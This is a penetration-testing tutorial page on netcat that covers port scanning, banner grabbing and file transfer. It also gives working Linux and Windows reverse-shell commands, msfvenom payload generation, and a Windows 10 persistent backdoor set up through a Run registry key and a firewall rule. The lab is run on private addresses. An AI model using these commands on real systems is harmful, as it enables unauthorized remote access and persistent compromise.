<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Netcat for Pentester</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/netcat-for-pentester/" rel="bookmark"><time class="entry-date published" datetime="2019-04-01T17:21:10+00:00">April 1, 2019</time><time class="updated" datetime="2025-06-06T21:40:40+00:00">June 6, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;"><em>“Whether it is port scanning or to get a reverse shell, everything is possible with <strong>Netcat.</strong>”</em> Today in this article we will be exploring one of the most commonly used network utility and will learn how the other frameworks reinforce <strong>“Netcat”</strong> in order to generate a session.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;">Introduction</span></li>
<li class="ai-optimize-9"><span style="color: #000000;">Why Netcat?</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Netcat Basic command</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Port Scanning</span>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;">TCP Scan</span></li>
<li class="ai-optimize-13"><span style="color: #000000;">UDP Scan</span></li>
</ul>
</li>
<li class="ai-optimize-14"><span style="color: #000000;">Chatting</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Banner Grabbing</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">File transfer</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Linux Reverse Shell</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Randomized port</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">Grabbing the HTTP Banner</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Windows Reverse Shell</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">Windows 10 Persistence</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">Msfvenom Payload with Netcat</span></li>
</ul>
<h3 class="ai-optimize-23"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-24"><span style="color: #000000;">Netcat technically used as <strong>“nc”</strong> – is a network utility that uses the TCP and UDP connections in order to read and write in a network. It can be used by both the attackers and the security auditors.</span></p>
<p class="ai-optimize-25"><span style="color: #000000;">Counting in the attacking scenario, this cross-functional tool can be driven by scripts which makes it quite dependable and if we discuss the security section, it helps us to debug and investigate the network.</span></p>
<p class="ai-optimize-26"><span style="color: #000000;"><em>Why netcat is such dependable, that it can do everything whether it is port scanning, banner grabbing, transferring a file, or even generating a reverse connection?</em></span></p>
<p class="ai-optimize-27"><span style="color: #000000;">Let’s check out the major netcat features and unlock this question.</span></p>
<ol>
<li class="ai-optimize-28"><span style="color: #000000;">It acts as a simple TCP/UDP/SCTP/SSL client for interacting with web servers, telnet servers, mail servers, and other TCP/IP network services.</span></li>
<li class="ai-optimize-29"><span style="color: #000000;">It redirects the TCP/UDP/SCTP traffic to other ports or hosts by acting as a SOCKS or HTTP proxy such that the clients specify their own destinations.</span></li>
<li class="ai-optimize-30"><span style="color: #000000;">Netcat can even connect to destinations through a chain of anonymous or authenticated proxies.</span></li>
<li class="ai-optimize-31"><span style="color: #000000;">Encrypts communication with SSL, and transport it over IPv4 or IPv6.</span></li>
<li class="ai-optimize-32"><span style="color: #000000;">It acts as a connection broker, allowing two (or far more) clients to connect to each other through a third (brokering) server.</span></li>
</ol>
<p class="ai-optimize-33"><span style="color: #000000;">So uptill now, you might be aware of all the features that Netcat has, which makes it unique and simple.</span></p>
<p class="ai-optimize-34"><span style="color: #000000;">Let’s try to dig deeper and explore what we can more do with this great tool.</span></p>
<h4 class="ai-optimize-35"><span style="color: #000000;">Netcat basic command</span></h4>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>“Help”</strong> or sometimes its <strong>“h”</strong>, this flag drops out every possible option that a tool can do for us. To start with netcat, we’ll be using the most basic help command i.e. :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -h</pre>
<p class="ai-optimize-37"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HiipCCUiV00/Xw4RyNgXwYI/AAAAAAAAl1Y/WNLhyHqZegcM0Hj2jVZ6GFB0SIlG8r0VACLcBGAsYHQ/s1600/1.png"/></span></p>
<h3 class="ai-optimize-38"><span style="color: #000000;"><span style="color: #800000;">Port Scanning</span> </span></h3>
<p class="ai-optimize-39"><span style="color: #000000;">Netcat can be used as a port scanner, although it was not designed to function as. To make it worth as a scanner, we need to set the <strong>“-z” </strong>flag, which tells netcat, to scan listing daemon without sending any data. This makes it possible to understand the type of service that is running on that specific port. Thus netcat can perform both the TCP and the UDP scan, let’s check it out how:</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><strong>TCP Scan</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -v -n -z 192.168.1.105 21-100</pre>
<p class="ai-optimize-41"><span style="color: #000000;">    <strong>[-v]: </strong>indicates Verbose mode</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><strong>    [-n]:</strong> indicates numeric-only IP addresses</span></p>
<p class="ai-optimize-43"><span style="color: #000000;"><strong>    [-z]:</strong> indicates zero -I/O mode [used for scanning]</span></p>
<p class="ai-optimize-44"><span style="color: #000000;">In order to complete this scan, we need to <strong>specify a range of ports.</strong> From the below image you can see that I’ve mentioned a port range of <strong>21-100, </strong>which will dump the running services over the target’s machine.</span></p>
<p class="ai-optimize-45"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pb11L7tKrmE/Xw4R17ULAWI/AAAAAAAAl1c/TOgDS8tAQ4YL6stPhogHAXfnOVxp2ooPgCLcBGAsYHQ/s1600/2.png"/></span></p>
<p class="ai-optimize-46"><span style="color: #000000;"><strong>UDP Scan</strong></span></p>
<p class="ai-optimize-47"><span style="color: #000000;">We can even scan the UDP ports in a similar way we scanned the TCP ones. Here we’ll be using the <strong>“–u”</strong> flag which will invoke the UDP mode.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -vzu 192.168.1.105 161</pre>
<p class="ai-optimize-48"><span style="color: #000000;">In this scenario, we have mentioned the port number rather than the range. From the below image you can see that we’ve captured the running <strong>“snmp” </strong>service.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YRjfnhq1i9A/Xw4R4-9aqGI/AAAAAAAAl1g/QKlMi0AU2xsxTqYGeFI2KSA6hurtD6CYwCLcBGAsYHQ/s1600/3.png"/></span></p>
<h3 class="ai-optimize-50"><span style="color: #800000;"><strong>Chatting</strong></span></h3>
<p class="ai-optimize-51"><span style="color: #000000;">Netcat can also be used to chat between two users. But before that, we need to establish a connection. To set up this all, we’ll be using two devices – one will play the role as <strong>an initiator</strong> and the other one will be <strong>a listener</strong>. As soon as this connection is established, the communication can be done from both ends.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Let’s check out this scenario, where two users with different operating systems communicate with each other over a Netcat established connection.</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Initially, <strong>kali’s root user</strong> needs to set up his netcat <strong>“listener”</strong> over a specific port, to build up a network connection. Run the following command to do so:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p class="ai-optimize-54"><span style="color: #000000;">here,</span></p>
<p class="ai-optimize-55"><span style="color: #000000;"><strong>[l]:</strong> Listen Mode</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><strong>[v]: </strong>Verbose Mode</span></p>
<p class="ai-optimize-57"><span style="color: #000000;"><strong>[p]:</strong> Local Port</span></p>
<p class="ai-optimize-58"><span style="color: #000000;">Now it’s time to setup an <strong>initiator</strong>, we’ll be doing this from the <strong>Ubuntu’s root user,</strong> by simply providing the IP Address of the system where we have started the <strong>listener </strong>followed by the port number.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc 192.168.1.109 1234</pre>
<p class="ai-optimize-59"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U2Ya4LR67f8/Xw4R8iY8g2I/AAAAAAAAl1k/6BX-OSqPjAQcC0MNA4hJoIQe7h8EiqDXACLcBGAsYHQ/s1600/4.png"/></span></p>
<p class="ai-optimize-60"><span style="color: #000000;">From the below image you can see that the <strong><em>connection has been setup</em></strong> and both the machines are now able to communicate with each other.</span></p>
<p class="ai-optimize-61"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yEs-XmnSBis/Xw4R_tvpk5I/AAAAAAAAl1o/D1reoDh29ocVi5vxSfljl7H_XS9EJg1GACLcBGAsYHQ/s1600/5.png"/></span></p>
<h3 class="ai-optimize-62"><span style="color: #800000;">Banner Grabbing</span></h3>
<p class="ai-optimize-63"><span style="color: #000000;">Banner refers to a text message received from the host with information about the open ports and services along with their version numbers.</span></p>
<p class="ai-optimize-64"><span style="color: #000000;">Run the following command to grab the target’s <strong>ftp </strong>and<strong> ssh banners</strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc 192.168.1.105 21 
nc 192.168.1.105 22</pre>
<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dmnGbj_9iHU/Xw4SCnOEWXI/AAAAAAAAl1s/O8rTfVeUX_4sVTU0tKfy_CFALAQjUmQ5ACLcBGAsYHQ/s1600/6.png"/></span></p>
<h3 class="ai-optimize-66"><span style="color: #800000;">File Transfer</span></h3>
<p class="ai-optimize-67"><span style="color: #000000;">Netcat offers us an opportunity to transfer files from one device to another over a network.</span></p>
<p class="ai-optimize-68"><span style="color: #000000;">Let’s follow up with a scenario, where a <strong>kali user </strong>exempts to transfer his files to a user at an <strong>Ubuntu machine</strong>.</span></p>
<p class="ai-optimize-69"><span style="color: #000000;">From the below image the user over the <strong>kali machine </strong>sets up a <strong>listener </strong>at port number <strong>5555, </strong>and shares file.txt using the <strong>“&lt;” </strong>parameter.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 5555 &lt; file.txt</pre>
<p class="ai-optimize-70"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q9S_ZwSUtTA/Xw4SG32OenI/AAAAAAAAl1w/26Bqv44mvLI0k7e_MgSBay3c1LmoKqSNgCLcBGAsYHQ/s1600/7.png"/></span></p>
<p class="ai-optimize-71"><span style="color: #000000;">Now the user sitting at the <strong>Ubuntu server </strong>will download this file by running the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc 192.168.1.109 5555 &gt; file.txt</pre>
<p class="ai-optimize-72"><span style="color: #000000;">From the below image you can see that the <strong>Ubuntu user</strong> has successfully grabbed the <strong>file.txt </strong> file from <strong>192.168.1.109</strong> which is nothing but the <strong>kali user’s IP</strong></span></p>
<p class="ai-optimize-73"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Cm7QJ1SoxmI/Xw4SJ8xr-dI/AAAAAAAAl10/SO-lwelAY3cdMqoFq5QPMZM1MM5Nw5-2QCLcBGAsYHQ/s1600/8.png"/></strong></span></p>
<h3 class="ai-optimize-74"><span style="color: #800000;"><strong>Linux Reverse Shell</strong></span></h3>
<p class="ai-optimize-75"><span style="color: #000000;">As discussed earlier netcat can perform anything, so now we’ll try to exploit the target’s machine with the help of <strong>“msfvenom”</strong> to create a payload and will setup a <strong>netcat listener</strong> to grab a session.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;">Let’s try to create a payload using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=6666 R</pre>
<p class="ai-optimize-77"><span style="color: #000000;">The <strong>“R” </strong>flag is used to generate a <strong>raw payload</strong> which will be over our screen.</span></p>
<p class="ai-optimize-78"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eI7v-ZsPu48/Xw4SM8PxiYI/AAAAAAAAl18/vOF99csUNSIJysNgBWIQChiZe49Ivas3ACLcBGAsYHQ/s1600/9.png"/></span></p>
<p class="ai-optimize-79"><span style="color: #000000;">From the above image, you can see that our payload is ready, now its time to trigger it over our victim’s server.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;">Open the Ubuntu machine and type this payload in the terminal. <strong>Before firing it up</strong>, get back to the attacker’s machine(kali Linux) and setup the <strong>netcat listener</strong> over there by using the same port number that you used while generating the payload.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LfDv0LdFWz0/Xw4SQlmTn0I/AAAAAAAAl2A/izC4aNEZ2wg_YK5vdDERnSlAy3F_UEICgCLcBGAsYHQ/s1600/10.png"/></span></p>
<p class="ai-optimize-82"><span style="color: #000000;">From the below image you can see that, as soon as the victim runs the payload, we’ll get the session.</span></p>
<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ChEcDWa8UEE/Xw4ST6hChJI/AAAAAAAAl2M/aDKR5XjeZcIgsiXFx3LW2_ccOyQ6AhWzgCLcBGAsYHQ/s1600/11.png"/></span></p>
<p class="ai-optimize-84"><span style="color: #000000;">There are many times when the <strong>security gets high</strong> and we fail to grab the session using this method, but there is another way to get a reverse shell.</span></p>
<p class="ai-optimize-85"><span style="color: #000000;">Before that, setup a netcat <strong>listener</strong> at port<strong> 443</strong>:</span></p>
<p class="ai-optimize-86"><span style="color: #000000;">As the listener boots in, just execute the following commands in the target’s machine :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mknod /tmp/backpipe p</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.109 443 1&gt;/tmp/backpipe</pre>
<p class="ai-optimize-87"><span style="color: #000000;">This will help you to bypass the security and offer you a netcat session.</span></p>
<p class="ai-optimize-88"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8SfTDyg7Xp4/Xw4SXlaZ3aI/AAAAAAAAl2U/BgLH0zNd3LAHmX7cn23NpAyG_8X-hm77wCLcBGAsYHQ/s1600/12.png"/></span></p>
<p class="ai-optimize-89"><span style="color: #000000;">From the below image you can see that we’ve successfully captured the victim’s shell.</span></p>
<p class="ai-optimize-90"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EKsaDXthoeI/Xw4Sak5UtGI/AAAAAAAAl2Y/wOk_MchhNgIWC7xusRh2AnfJJnKFcKkxgCLcBGAsYHQ/s1600/13.png"/></span></p>
<h3 class="ai-optimize-91"><span style="color: #800000;">Randomized Port</span></h3>
<p class="ai-optimize-92"><span style="color: #000000;">There are chances when we aren’t able to decide the very own port to set up a listener or to establish a netcat connection. Well, netcat has a special <strong>“–r”</strong> flag which will provide us randomized local port.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lv –r</pre>
<p class="ai-optimize-93"><span style="color: #000000;">From the below image you can see that our listener has been started at <strong>38931.</strong></span></p>
<p class="ai-optimize-94"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jqnEpFuw4c0/Xw4SefNNJ8I/AAAAAAAAl2c/90oQ1nb7XUgJD_x556HFC6TH3gUt62qHACLcBGAsYHQ/s1600/14.png"/></span></p>
<h3 class="ai-optimize-95"><span style="color: #800000;"><strong>Grabbing the HTTP Banner</strong></span></h3>
<p class="ai-optimize-96"><span style="color: #000000;">HTTP banners are now can’t be fetched easily, as they contain the server’s information. But we can use netcat to capture information about any webserver.</span></p>
<p class="ai-optimize-97"><span style="color: #000000;">Simply run the following command in order to manipulate the <strong>target’s server</strong> and check what we have grabbed.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">printf "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.105 80</pre>
<p class="ai-optimize-98"><span style="color: #000000;">Great!! From the below image you can see that I’ve successfully captured the HTTP banner and we are presented with the <strong>Apache server.</strong></span></p>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I9R8G-GyAWE/Xw4Sh7IXQtI/AAAAAAAAl2g/cBjmazJZBG0R77v6d78WswENfFW3u66sACLcBGAsYHQ/s1600/15.png"/></span></p>
<h3 class="ai-optimize-100"><span style="color: #800000;">Windows Reverse Connection</span></h3>
<p class="ai-optimize-101"><span style="color: #000000;">A system’s backdoor welcomes us every time with open hands whenever we knockback.</span></p>
<p class="ai-optimize-102"><span style="color: #000000;">Thus we’ll try to generate such a similar backdoor over the target’s windows machine, which allows us to get in, at any time when we come back.</span></p>
<p class="ai-optimize-103"><span style="color: #000000;">Let’s setup a <strong>listener</strong> over our kali machine first:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444</pre>
<p class="ai-optimize-104"><span style="color: #000000;">Now execute the following command over the victim’s <strong>windows command prompt </strong>to create a backdoor<strong>.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc.exe 192.168.1.109 4444 -e cmd.exe</pre>
<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5e2gQDhEQFI/Xw4SlkjpzCI/AAAAAAAAl2o/B86S3Mjpt4oF3Qlt1UU4lHmKNw_nCWBrACLcBGAsYHQ/s1600/16.png"/></span></p>
<p class="ai-optimize-106"><span style="color: #000000;">Time to get back to our <strong>attacker’s machine</strong>. From the below image you can see that we are into the victim’s command shell.</span></p>
<p class="ai-optimize-107"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ABqwhinfo-k/Xw4SonDGJTI/AAAAAAAAl2w/SkTsyr_z7n0eYrFCnNQxPE3Gwict2_cdACLcBGAsYHQ/s1600/17.png"/></span></p>
<h3 class="ai-optimize-108"><span style="color: #800000;">Windows 10 Persistence</span></h3>
<p class="ai-optimize-109"><span style="color: #000000;">Persistence plays a major role in an attacker’s life. So let’s try to create a <strong>persistent backdoor</strong> using netcat and Metasploit framework, on the host machine which we have compromised.</span></p>
<p class="ai-optimize-110"><span style="color: #000000;">From the below image you can see that I’ve grabbed a <strong>meterpreter session</strong> of a <strong>Windows 10</strong> machine.</span></p>
<p class="ai-optimize-111"><span style="color: #000000;">Now upload <strong>netcat.exe</strong> file into <strong>system32</strong> in the victim’s pc by using the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</pre>
<p class="ai-optimize-112"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5FojMj3JNyw/Xw4SsetgMHI/AAAAAAAAl20/xKDGry1AKj02O-Kyrl8vMv1Oaq7KAK5QQCLcBGAsYHQ/s1600/18.png"/></span></p>
<p class="ai-optimize-113"><span style="color: #000000;">Now set up netcat to a <strong>listener</strong> at any random port say <strong>4445</strong>, open the port on startup and make the connection.</span></p>
<p class="ai-optimize-114"><span style="color: #000000;">Use the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'</pre>
<p class="ai-optimize-115"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VGvw_n5pENo/Xw4SwmUsfoI/AAAAAAAAl24/UfjJIRSrzCo6agH093W6qhxwLFTrf-YvwCLcBGAsYHQ/s1600/19.png"/></span></p>
<p class="ai-optimize-116"><span style="color: #000000;">On a successful netcat connection, we will get the reverse_shell of the victim’s PC.</span></p>
<p class="ai-optimize-117"><span style="color: #000000;">Now its time to add up a new rule to firewall named as <strong>‘netcat’</strong> in which the <strong>inbound connection</strong> will allow for <strong>port 4445</strong> by using the interactive cmd prompt running a command called <strong>netsh</strong>.</span></p>
<p class="ai-optimize-118"><span style="color: #000000;">Type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445</pre>
<p class="ai-optimize-119"><span style="color: #000000;">Let’s check out the operational mode and the port status by running up the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netsh firewall show portopening</pre>
<p class="ai-optimize-120"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sfptWxrx4Hw/Xw4Szxbd5GI/AAAAAAAAl3A/8ELnPREvuTgAzodzi-kV725aDzGpjJzBwCLcBGAsYHQ/s1600/20.png"/></span></p>
<p class="ai-optimize-121"><span style="color: #000000;">So with all that, we are done. Now when the victim <strong>reboots the system</strong> again, we will get the netcat shell. Run the following command to connect our <strong>netcat backdoor</strong> via port <strong>4445</strong>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -nv 192.168.1.105 4445</pre>
<p class="ai-optimize-122"><span style="color: #000000;">Great!! We’ve successfully maintained the <strong>permanent</strong> <strong>backdoor</strong>, now whenever the victim boots in we’ll always have its session. To learn more about Windows persistence click <a style="color: #000000;" href="https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/">here</a>.</span></p>
<p class="ai-optimize-123"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jbtIOCz_0Tc/Xw4S3JQ8hYI/AAAAAAAAl3E/pamaiMvDbcw0c1HR_zB-9-91_wNMBIs8QCLcBGAsYHQ/s1600/21.png"/></span></p>
<h3 class="ai-optimize-124"><span style="color: #800000;">Msfvenom Payload with Netcat</span></h3>
<p class="ai-optimize-125"><span style="color: #000000;">Until now we’ve learned everything about Netcat, from its basic things to its advanced ones. So let’s learn how we can connect with the victim through our Netcat_shell using a msfvenom payload.</span></p>
<p class="ai-optimize-126"><span style="color: #000000;">Fire up the terminal and run the following command to generate a <strong>.exe</strong> payload</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.104 lport=3333 –f exe &gt; shell.exe</pre>
<p class="ai-optimize-127"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rt2-OFHdTxQ/Xw4S6geJvsI/AAAAAAAAl3I/1Z3a6TZJ_hAUsQ3tnlTkOGpnwdkg7sQOgCLcBGAsYHQ/s1600/22.png"/></span></p>
<p class="ai-optimize-128"><span style="color: #000000;">Now <strong>turn on</strong> the Netcat <strong>listener </strong>over port <strong>3333.</strong></span></p>
<p class="ai-optimize-129"><span style="color: #000000;">Share this generated payload with the victim, as soon as he/she opens it up you’ll get the <strong>reverse connection.</strong></span></p>
<p class="ai-optimize-130"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-7YEeKzBc6Ek/Xw4S9_qqBUI/AAAAAAAAl3Q/-jOdbi1sfGAjXgxlK41CB74p-idRHss2wCLcBGAsYHQ/s1600/23.png"/></strong></span></p>
<p class="ai-optimize-131"><span style="color: #000000;"><strong>Author</strong>: Chiragh Arora is a passionate Researcher and Technical Writer at Hacking Articles. He is a hacking enthusiast. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/chiragh-arora/">here</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
